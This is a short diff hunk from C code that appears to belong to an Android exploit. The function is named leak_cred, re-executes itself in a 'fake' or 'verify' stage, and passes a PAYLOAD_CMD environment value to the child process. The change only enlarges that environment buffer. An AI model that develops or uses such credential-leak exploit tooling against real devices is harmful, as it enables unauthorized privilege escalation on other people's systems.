@@ -2101,7 +2101,7 @@ static unsigned long long leak_cred(unsigned char *raw,
                                        (g_fake_stage ? "fake" : "verify")));
                 char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                     (char *)cmode, NULL};
-                char pcenv[512];
+                char pcenv[1024];
                 const char *pcg = getenv("PAYLOAD_CMD");
                 char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin",
                                     pcenv, NULL};
